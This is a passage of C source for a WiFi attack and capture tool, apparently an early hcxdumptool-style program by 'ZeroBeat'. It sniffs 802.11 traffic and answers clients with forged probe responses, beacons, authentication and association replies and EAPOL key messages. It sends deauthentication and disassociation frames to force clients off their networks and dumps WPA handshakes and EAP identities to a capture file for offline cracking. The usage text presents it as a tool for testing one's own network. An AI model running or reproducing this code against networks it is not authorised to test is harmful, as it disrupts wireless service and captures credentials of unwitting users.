for(c = 0; c < RINGBUFFERSIZE; c++)
	{
	if((zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
		{
		zeiger->tv_sec = tvsec;
		sendproberesponse(mac_sta, zeiger->addr_ap.addr, essid_len, essidname);
		return true;
		}
	if(memcmp(nulladdr.addr, zeiger->addr_ap.addr, 6) == 0)
		break;
	zeiger++;
	}
zeiger->tv_sec = tvsec;
memcpy(zeiger->addr_ap.addr, &myaddr, 6);
nextmac();
zeiger->essid_len = essid_len;
memset(zeiger->essid, 0, 32);
memcpy(zeiger->essid, essidname, essid_len);
sendproberesponse(mac_sta, zeiger->addr_ap.addr, essid_len, essidname);
qsort(proberequestliste, RINGBUFFERSIZE +1, APL_SIZE, sortaplist_by_time);
return false;
}
/*===========================================================================*/
bool handledirectproberequestframes(time_t tvsec, uint8_t *mac_sta, uint8_t *mac_ap, uint8_t essid_len, uint8_t **essidname)
{
staapl_t *zeiger;
int c;

zeiger = directproberequestliste;
for(c = 0; c < RINGBUFFERSIZE; c++)
	{
	if((memcmp(zeiger->addr_sta.addr, mac_sta, 6) == 0) && (memcmp(zeiger->addr_ap.addr, mac_ap, 6) == 0) && (zeiger->essid_len == essid_len) && (memcmp(zeiger->essid, essidname, essid_len) == 0))
		{
		zeiger->tv_sec = tvsec;
		return true;
		}
	if(memcmp(nulladdr.addr, zeiger->addr_ap.addr, 6) == 0)
		break;
	zeiger++;
	}
zeiger->tv_sec = tvsec;
memcpy(zeiger->addr_sta.addr, mac_sta, 6);
memcpy(zeiger->addr_ap.addr, mac_ap, 6);
zeiger->essid_len = essid_len;
memset(zeiger->essid, 0, 32);
memcpy(zeiger->essid, essidname, essid_len);
qsort(directproberequestliste, RINGBUFFERSIZE +1, STAAPL_SIZE, sortstaaplist_by_time);
return false;
}
/*===========================================================================*/
uint8_t geteapkey(eap_t *eap)
{
uint16_t keyinfo;

keyinfo = (((eap->keyinfo & 0xff) << 8) | (eap->keyinfo >> 8));
if (keyinfo & WPA_KEY_INFO_ACK)
	{
	if(keyinfo & WPA_KEY_INFO_INSTALL)
		{
		/* handshake 3 */
		return WPA_M3;
		}
	else
		{
		/* handshake 1 */
		return WPA_M1;
		}
	}
else
	{
	if(keyinfo & WPA_KEY_INFO_SECURE)
		{
		/* handshake 4 */
		return WPA_M4;
		}
	else
		{
		/* handshake 2 */
		return WPA_M2;
		}
	}
}
/*===========================================================================*/


/*===========================================================================*/
void programmende(int signum)
{
if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL))
	{
	set_timer(timer1, 0, 0);
	set_timer(timer2, 0, 0);
	pcap_dump_flush(pcapout);
	pcap_dump_close(pcapout);
	pcap_close(pcapin);
	printf("\nterminated...\n");
	exit (EXIT_SUCCESS);
	}
return;
}
/*===========================================================================*/
timer_t create_timer(int signo)
{
timer_t timerid;
struct sigevent se;
se.sigev_notify=SIGEV_SIGNAL;
se.sigev_signo = signo;
if(timer_create(CLOCK_REALTIME, &se, &timerid) == -1)
	{
	perror("failed to create timer");
	exit(EXIT_FAILURE);
	}
return timerid;
}
/*===========================================================================*/
void set_timer(timer_t timerid, int seconds, long int nanoseconds)
{
struct itimerspec timervals;
timervals.it_value.tv_sec = seconds;
timervals.it_value.tv_nsec = nanoseconds;
timervals.it_interval.tv_sec = seconds;
timervals.it_interval.tv_nsec = nanoseconds;

if(timer_settime(timerid, 0, &timervals, NULL) == -1)
	{
	perror("failed to start timer");
	exit(EXIT_FAILURE);
	}
return;
}
/*===========================================================================*/
void install_sighandler(int signo, void(*handler)(int))
{
sigset_t set;
struct sigaction act;

/* Setup the handler */
act.sa_handler = handler;
act.sa_flags = SA_RESTART;
sigaction(signo, &act, 0);

/* Unblock the signal */
sigemptyset(&set);
sigaddset(&set, signo);
sigprocmask(SIG_UNBLOCK, &set, NULL);
return;
}
/*===========================================================================*/
void signal_handler(int signo)
{
if(signo == TT_SIGUSR1)
	{
#ifdef DOGPIOSUPPORT
	digitalWrite(0, HIGH);
	delay (25);
	digitalWrite(0, LOW);
	delay (25);
	if(digitalRead(7) == 1)
		{
		digitalWrite(0, HIGH);
		pcap_dump_flush(pcapout);
		pcap_dump_close(pcapout);
		pcap_close(pcapin);
		system("poweroff");
		}
#endif
	return;
	}

if(signo == TT_SIGUSR2)
	{
	pcap_breakloop(pcapin);
	return;
	}
return;
}
/*===========================================================================*/
void setchannel()
{
struct iwreq wrq;

int sock = 0;
int result = 0;
memset(&wrq, 0, sizeof(struct iwreq));
strncpy(wrq.ifr_name, interfacename , IFNAMSIZ);
if((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
	{
        fprintf(stderr, "socket open for ioctl() on '%s' failed with '%d'\n", interfacename, sock);
#ifdef DOGPIOSUPPORT
	system("reboot");
#endif
	programmende(SIGINT);
	}

wrq.u.freq.m = channel;
wrq.u.freq.e = 0;
wrq.u.freq.flags = IW_FREQ_FIXED;
if(ioctl(sock, SIOCSIWFREQ, &wrq) < 0)
	{
	usleep(100);
	if((result = ioctl(sock, SIOCSIWFREQ, &wrq)) < 0)
		{
		fprintf(stderr, "ioctl(SIOCSIWFREQ) on '%s' failed with '%d'\n", interfacename, result);
		fprintf(stderr, "unable to set channel on '%s', exiting\n", interfacename);
#ifdef DOGPIOSUPPORT
		system("reboot");
#endif
		programmende(SIGINT);
		}
	}
close(sock);
return;
}
/*===========================================================================*/
__attribute__ ((noreturn))
void pcaploop(int has_rth)
{
const uint8_t *packet = NULL;
const uint8_t *h80211 = NULL;
struct pcap_pkthdr *pkh;
rth_t *rth = NULL;
mac_t *macf = NULL;
essid_t *essidf;
uint8_t	*payload = NULL;
uint8_t field = 0;
authf_t *authenticationreq = NULL;
mpdu_frame_t *enc = NULL;
int pcapstatus = 1;
int macl = 0;
int fcsl = 0;
eap_t *eap = NULL;
uint8_t mkey;
int packetcount = 0;
int proberequestcount = 0;
apl_t *zeigerproberequest = proberequestliste;

printf("capturing - %06llx%06llx (stop with ctrl+c)...\n", myoui, mynic);

while(1)
	{
	pcapstatus = pcap_next_ex(pcapin, &pkh, &packet);
	if(pcapstatus == 0)
		continue;

	if(pcapstatus == -1)
		{
		fprintf(stderr, "pcap read error: %s \n", pcap_geterr(pcapin));
		continue;
		}

	if(pcapstatus == -2)
		{
		channel++;
		if(channel > 13)
			channel = 1;
		setchannel();
		continue;
		}

	if(pkh->caplen != pkh->len)
		continue;

	/* check radiotap-header */
	h80211 = packet;
	if(has_rth == true)
		{
		if(RTH_SIZE > pkh->len)
			continue;
		rth = (rth_t*)packet;
		fcsl = 0;
		field = 12;
		if((rth->it_present & 0x01) == 0x01)
			field += 8;
		if((rth->it_present & 0x80000000) == 0x80000000)
			field += 4;
		if((rth->it_present & 0x02) == 0x02)
			{
			if((packet[field] & 0x10) == 0x10)
				fcsl = 4;
			}

		pkh->caplen -= rth->it_len +fcsl;
		pkh->len -=  rth->it_len +fcsl;
		h80211 = packet + rth->it_len;
		}

	macf = (mac_t*)(h80211);
	if((macf->to_ds == 1) && (macf->from_ds == 1))
		macl = MAC_SIZE_LONG;
	else
		macl = MAC_SIZE_NORM;


	if(MAC_SIZE_NORM > pkh->len)
		continue;


	if (macf->type == MAC_TYPE_CTRL)
		{
		if (macf->subtype == MAC_ST_RTS)
			macl = MAC_SIZE_RTS;
		else
			{
			if (macf->subtype == MAC_ST_ACK)
				macl = MAC_SIZE_ACK;
			}
		}
	 else
		{
		if (macf->type == MAC_TYPE_DATA)
			if (macf->subtype & MAC_ST_QOSDATA)
				macl += QOS_SIZE;
		}

	payload = ((uint8_t*)macf)+macl;

	if(lastbeaconing == true)
		{
		packetcount++;
		if(packetcount > 20)
			{
			zeigerproberequest = proberequestliste + proberequestcount;
			if(zeigerproberequest->essid_len == 0)
				proberequestcount = 0;
			else
				sendbeacon(zeigerproberequest->addr_ap.addr, zeigerproberequest->essid_len, zeigerproberequest->essid);
			proberequestcount++;
			if(proberequestcount >= 10)
				proberequestcount = 0;
			packetcount = 0;
			}
		}

	/* check management frames */
	if(macf->type == MAC_TYPE_MGMT)
		{
		if(macf->subtype == MAC_ST_BEACON)
			{
			if((macl +BEACONINFO_SIZE) > pkh->len)
				continue;
			essidf = (essid_t*)(payload +BEACONINFO_SIZE);
			if(essidf->info_essid != 0)
				continue;
			if((essidf->info_essid_len == 0) || (essidf->info_essid_len > 32))
				continue;
			if(essidf->essid[0] == 0)
				continue;
			if(memcmp(myaddr.addr, macf->addr2.addr, 3) == 0)
				continue;
			if(handlebeaconframes(pkh->ts.tv_sec, macf->addr2.addr, essidf->info_essid_len, essidf->essid) == false)
				{
				pcap_dump((u_char *)pcapout, pkh, h80211);
				}
			continue;
			}

		else if(macf->subtype == MAC_ST_PROBE_RESP)
			{
			if((macl +BEACONINFO_SIZE) > pkh->len)
				continue;
			essidf = (essid_t*)(payload +BEACONINFO_SIZE);
			if(essidf->info_essid != 0)
				continue;
			if((essidf->info_essid_len == 0) || (essidf->info_essid_len > 32))
				continue;
			if(essidf->essid[0] == 0)
				continue;
			if(memcmp(myaddr.addr, macf->addr2.addr, 3) == 0)
				continue;
			if(handleproberesponseframes(pkh->ts.tv_sec, macf->addr1.addr, macf->addr2.addr, essidf->info_essid_len, essidf->essid) == false)
				{
				pcap_dump((u_char *)pcapout, pkh, h80211);
				}
			continue;
			}

		else if(macf->subtype == MAC_ST_PROBE_REQ)
			{
			if((macl +BEACONINFO_SIZE) > pkh->len)
				continue;
			essidf = (essid_t*)(payload);
			if(essidf->info_essid != 0)
				continue;
			if((essidf->info_essid_len == 0) || (essidf->info_essid_len > 32))
				continue;
			if(essidf->essid[0] == 0)
				continue;
			if(memcmp(broadcastaddr.addr, macf->addr1.addr, 6) == 0)
				{
				if(handleproberequestframes(pkh->ts.tv_sec, macf->addr2.addr, essidf->info_essid_len, essidf->essid) == false)
					{
					pcap_dump((u_char *)pcapout, pkh, h80211);
					}
				}
			else
				{
				sendproberesponse(macf->addr2.addr, macf->addr1.addr, essidf->info_essid_len, essidf->essid);
				if(handledirectproberequestframes(pkh->ts.tv_sec, macf->addr2.addr, macf->addr1.addr, essidf->info_essid_len, essidf->essid) == false)
					{
					pcap_dump((u_char *)pcapout, pkh, h80211);
					}
				}
			continue;
			}

		else if(macf->subtype == MAC_ST_ASSOC_REQ)
			{
			if((macl +ASSOCIATIONREQF_SIZE) > pkh->len)
				continue;
			essidf = (essid_t*)(payload +ASSOCIATIONREQF_SIZE);
			if(essidf->info_essid != 0)
				continue;
			if((essidf->info_essid_len == 0) || (essidf->info_essid_len > 32))
				continue;
			if(essidf->essid[0] == 0)
				continue;
			pcap_dump((u_char *)pcapout, pkh, h80211);
			sendacknowledgement(macf->addr2.addr);
			sendassociationresponse(MAC_ST_ASSOC_RESP, macf->addr2.addr, macf->addr1.addr);
			sendkey1(macf->addr2.addr, macf->addr1.addr);
			continue;
			}

		else if(macf->subtype == REASSOCIATIONREQF_SIZE)
			{
			if((macl +REASSOCIATIONREQF_SIZE) > pkh->len)
				continue;
			essidf = (essid_t*)(payload +REASSOCIATIONREQF_SIZE);
			if(essidf->info_essid != 0)
				continue;
			if((essidf->info_essid_len == 0) || (essidf->info_essid_len > 32))
				continue;
			if(essidf->essid[0] == 0)
				continue;
			pcap_dump((u_char *)pcapout, pkh, h80211);
			sendacknowledgement(macf->addr2.addr);
			sendassociationresponse(MAC_ST_REASSOC_RESP, macf->addr2.addr, macf->addr1.addr);
			sendkey1(macf->addr2.addr, macf->addr1.addr);
			continue;
			}

		else if(macf->subtype == MAC_ST_AUTH)
			{
			authenticationreq = (authf_t*)(payload);
			if(authenticationreq->authentication_seq == 1)
				{
				sendacknowledgement(macf->addr2.addr);
				sendauthentication(macf->addr2.addr, macf->addr1.addr);
				}
			continue;
			}
		continue;
		}

	if((macf->type == MAC_TYPE_CTRL) && (staytime <= 10))
		{
		if(macf->subtype == MAC_ST_BACK)
			{
			senddeauth(MAC_ST_DEAUTH, WLAN_REASON_UNSPECIFIED, macf->addr1.addr,  macf->addr2.addr);
			senddeauth(MAC_ST_DEAUTH, WLAN_REASON_UNSPECIFIED, macf->addr2.addr,  macf->addr1.addr);
			continue;
			}

		if(macf->subtype == MAC_ST_BACK_REQ)
			{
			senddeauth(MAC_ST_DEAUTH, WLAN_REASON_UNSPECIFIED, macf->addr1.addr,  macf->addr2.addr);
			senddeauth(MAC_ST_DEAUTH, WLAN_REASON_UNSPECIFIED, macf->addr2.addr,  macf->addr1.addr);
			continue;
			}

		continue;
		}

	if((macf->type == MAC_TYPE_DATA) && ((macf->subtype == MAC_ST_NULL) || (macf->subtype == MAC_ST_QOSNULL)) && (staytime <= 10))
		{
		senddeauth(MAC_ST_DISASSOC, WLAN_REASON_DISASSOC_STA_HAS_LEFT, macf->addr1.addr,  macf->addr2.addr);
		senddeauth(MAC_ST_DISASSOC, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY, macf->addr2.addr,  macf->addr1.addr);
		continue;
		}

	if((macf->type != MAC_TYPE_DATA) || (macl +LLC_SIZE > pkh->len))
		continue;

	if((((llc_t*)payload)->dsap != LLC_SNAP) || (((llc_t*)payload)->ssap != LLC_SNAP))
		{
		if(macf->protected == 1)
			{
			enc = (mpdu_frame_t*)(payload);
			if((wepdata == true) && (((enc->keyid >> 5) &1) == 0))
				pcap_dump((u_char *) pcapout, pkh, h80211);
			continue;
			}
		continue;
		}

	/* check handshake frames */
	if((be16toh(((llc_t*)payload)->type) == LLC_TYPE_AUTH))
		{
		eap = (eap_t*)(payload + LLC_SIZE);
		if(eap->type == 3)
			{
			pcap_dump((u_char *)pcapout, pkh, h80211);
			mkey = geteapkey(eap);
			if(mkey == WPA_M4)
				{
				pcap_dump_flush(pcapout);
				senddeauth(MAC_ST_DISASSOC, WLAN_REASON_DISASSOC_AP_BUSY, macf->addr2.addr, macf->addr1.addr);
				}
			continue;
			}

		else if(eap->type == 0)
			{
			pcap_dump((u_char *)pcapout, pkh, h80211);
			}

		else if(eap->type == 1)
			{
//			pcap_dump((u_char *)pcapout, pkh, h80211);
			if(eap->len == 0)
				{
				sendacknowledgement(macf->addr2.addr);
				sendrequestidentity(macf->addr2.addr, macf->addr1.addr);
				}
			}
		continue;
		}

	else if((ipv46 == true) && (be16toh(((llc_t*)payload)->type) == LLC_TYPE_IPV4))
		{
		pcap_dump((u_char *)pcapout, pkh, h80211);
		continue;
		}

	else if((ipv46 == true) && (be16toh(((llc_t*)payload)->type) == LLC_TYPE_IPV6))
		{
		pcap_dump((u_char *)pcapout, pkh, h80211);
		continue;
		}
	}
}
/*===========================================================================*/
void installbpf(pcap_t *pcapin, char *externalbpfname)
{
struct stat statinfo;
struct bpf_program filter;
FILE *fhbpf = NULL;
int bpfsize = 0;

char *extfilterstring = NULL;

char pcaperrorstring[PCAP_ERRBUF_SIZE];


if(externalbpfname != NULL)
	{
	if(stat(externalbpfname, &statinfo) != 0)
		{
		fprintf(stderr, "can't stat BPF %s\n", externalbpfname);
		exit(EXIT_FAILURE);
		}
	if((fhbpf = fopen(externalbpfname, "r")) == NULL)
		{
		fprintf(stderr, "error opening BPF %s\n", externalbpfname);
		exit(EXIT_FAILURE);
		}
	extfilterstring = malloc(statinfo.st_size +1);
	if(extfilterstring == NULL)
		{
		fprintf(stderr, "out of memory to store BPF\n");
		exit(EXIT_FAILURE);
		}
	extfilterstring[statinfo.st_size] = 0;
	bpfsize = fread(extfilterstring, 1, statinfo.st_size, fhbpf);
	if(bpfsize != statinfo.st_size)
		{
		fprintf(stderr, "error reading BPF %s\n", externalbpfname);
		free(extfilterstring);
		exit(EXIT_FAILURE);
		}
	fclose(fhbpf);
	filterstring = extfilterstring;
	}

if(pcap_compile(pcapin, &filter, filterstring, 1, 0) < 0)
	{
	fprintf(stderr, "error compiling BPF %s \n", pcap_geterr(pcapin));
	exit(EXIT_FAILURE);
	}

if(pcap_setfilter(pcapin, &filter) < 0)
	{
	sprintf(pcaperrorstring, "error installing BPF ");
	pcap_perror(pcapin, pcaperrorstring);
	exit(EXIT_FAILURE);
	}

pcap_freecode(&filter);

if(extfilterstring != NULL)
	free(extfilterstring);

return;
}
/*===========================================================================*/
bool startcapturing(char *pcapoutname, char *externalbpfname)
{
struct stat statinfo;
pcap_t *pcapdh = NULL;
int datalink = 0;
int c = 0;
int has_rth = false;

char newpcapoutname[PATH_MAX +2];
char pcaperrorstring[PCAP_ERRBUF_SIZE];

if(pcapoutname == NULL)
	{
	fprintf(stderr, "no output file selected\n");
	exit(EXIT_FAILURE);
	}

pcapin = pcap_open_live(interfacename, 65535, 1, 5, pcaperrorstring);
if(pcapin == NULL)
	{
	fprintf(stderr, "error opening device %s: %s\n", interfacename, pcaperrorstring);
	exit(EXIT_FAILURE);
	}

datalink = pcap_datalink(pcapin);
	if (datalink == DLT_IEEE802_11_RADIO)
		has_rth = true;

installbpf(pcapin, externalbpfname);

strcpy(newpcapoutname, pcapoutname);
while(stat(newpcapoutname, &statinfo) == 0)
	{
	snprintf(newpcapoutname, PATH_MAX, "%s-%d.cap", pcapoutname, c);
	c++;
	}
pcapdh = pcap_open_dead(DLT_IEEE802_11, 65535);
if ((pcapout = pcap_dump_open(pcapdh, newpcapoutname)) == NULL)
	{
	fprintf(stderr, "error creating dump file %s\n", newpcapoutname);
	exit(EXIT_FAILURE);
	}

#ifdef DOGPIOSUPPORT
if(wiringPiSetup() == -1)
	{
	puts ("wiringPi failed!");
	programmende(SIGINT);
	}

pinMode(0, OUTPUT);
pinMode(7, INPUT);

for (c = 0; c < 5; c++)
	{
	digitalWrite(0 , HIGH);
	delay (200);
	digitalWrite(0, LOW);
	delay (200);
	}
#endif

setchannel();

signal(SIGINT, programmende);
timer1 = create_timer(TT_SIGUSR1);
timer2 = create_timer(TT_SIGUSR2);
install_sighandler(TT_SIGUSR1, signal_handler);
install_sighandler(TT_SIGUSR2, signal_handler);
set_timer(timer1, TIME_INTERVAL_1S, TIME_INTERVAL_1NS);
set_timer(timer2, staytime, TIME_INTERVAL_2NS);

pcaploop(has_rth);
return true;
}
/*===========================================================================*/
__attribute__ ((noreturn))
static void version(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n", eigenname, VERSION, VERSION_JAHR);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static void usage(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n"
	"usage: %s <options>\n"
	"(ctrl+c terminates program)\n"
	"options:\n"
	"-i <interface> : WLAN interface\n"
	"-o <file>      : output cap file\n"
	"-t <seconds>   : stay time on channel before hopping to the next channel\n"
	"               : default: %d seconds\n"
	"-l             : capture IPv4 and IPv6 packets\n"
	"-L             : capture wep encrypted data packets\n"
	"-b             : activate beaconing on last 10 proberequests\n"
	"-F <file>      : input file containing entries for Berkeley Packet Filter (BPF)\n"
	"               : syntax: https://biot.com/capstats/bpf.html\n"
	"-h             : help screen\n"
	"-v             : version\n"
	"\n"
	"%s is not a cracking tool like hashcat\n"
	"it is designed to run penetrationtests on your WiFi network\n"
	"\n"
	"deauthentication depends on option -t (*5) and beaconinterval of accesspoint\n"
	"disassociation depends on option -t (<=10)\n"
	"examples:\n"
	"-t 3     = deauthenticate every 15 beacons\n"
	"           disassociate every NULL, QOSNULL, BLock Ack Request, Block Ack\n"
	"-t 10    = deauthenticate every 50 beacons\n"
	"           disassociate every NULL, QOSNULL, BLock Ack Request, Block Ack\n"
	"-t 11    = deauthenticate every 55 beacons\n"
	"           do not disassociate every NULL, QOSNULL, BLock Ack Request, Block Ack\n"
	"-t 86400 = deauthenticate every 432000 beacons\n"
	"           do not disassociate every NULL, QOSNULL, BLock Ack Request, Block Ack\n"
	"\n", eigenname, VERSION, VERSION_JAHR, eigenname, staytime, eigenname);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static void usageerror(char *eigenname)
{
printf("%s %s (C) %s by ZeroBeat\n"
	"usage: %s -h for help\n", eigenname, VERSION, VERSION_JAHR, eigenname);
exit(EXIT_FAILURE);
}
/*===========================================================================*/
int main(int argc, char *argv[])
{
pcap_if_t *alldevs, *d;
int auswahl;
char *eigenpfadname, *eigenname;
char *pcapoutname = NULL;
char *externalbpfname = NULL;

char pcaperrorstring[PCAP_ERRBUF_SIZE];

eigenpfadname = strdupa(argv[0]);
eigenname = basename(eigenpfadname);

setbuf(stdout, NULL);
srand(time(NULL));
while ((auswahl = getopt(argc, argv, "i:o:t:F:lLbhv")) != -1)
	{
	switch (auswahl)
		{
		case 'i':
		interfacename = optarg;
		if(interfacename == NULL)
			{
			fprintf(stderr, "no interface specified\n");
			exit (EXIT_FAILURE);
			}
		break;

		case 'o':
		pcapoutname = optarg;
		break;

		case 'b':
		lastbeaconing = true;
		break;

		case 't':
		staytime = strtol(optarg, NULL, 10);
		if(staytime < 0)
			{
			fprintf(stderr, "wrong hoptime\nsetting hoptime to %d seconds\n", TIME_INTERVAL_2S);
			staytime = TIME_INTERVAL_2S;
			}
		break;

		case 'l':
		ipv46 = true;
		break;

		case 'L':
		wepdata = true;
		break;

		case 'F':
		externalbpfname = optarg;
		break;

		case 'h':
		usage(eigenname);

		case 'v':
		version(eigenname);

		default:
		usageerror(eigenname);
		}
	}

if( getuid() != 0 )
	{
	fprintf(stderr, "this program requires root privileges\n" );
	exit(EXIT_FAILURE);
	}

if(interfacename == NULL)
	{
	fprintf(stdout,"\nno device selected - suitable devices:\n--------------------------------------\n");

	if(pcap_findalldevs(&alldevs, pcaperrorstring) == -1)
		{
		fprintf(stderr,"error in pcap_findalldevs: %s\n", pcaperrorstring);
		exit (EXIT_FAILURE);
		}

	for(d=alldevs; d; d=d->next)
		{
		fprintf(stdout, "%s", d->name);
		if(d->description)
			printf(" (%s)\n", d->description);

		else
		fprintf(stdout," (no description available)\n");
		}

	pcap_freealldevs(alldevs);
	exit (EXIT_FAILURE);
	}

if(initgloballists() != true)
	{
	fprintf(stderr, "could not allocate memory for tables\n" );
	exit (EXIT_FAILURE);
	}

if(startcapturing(pcapoutname, externalbpfname) == false)
	{
	fprintf(stderr, "could not init device\n" );
	exit (EXIT_FAILURE);
	}

return EXIT_SUCCESS;
}
/*===========================================================================*/
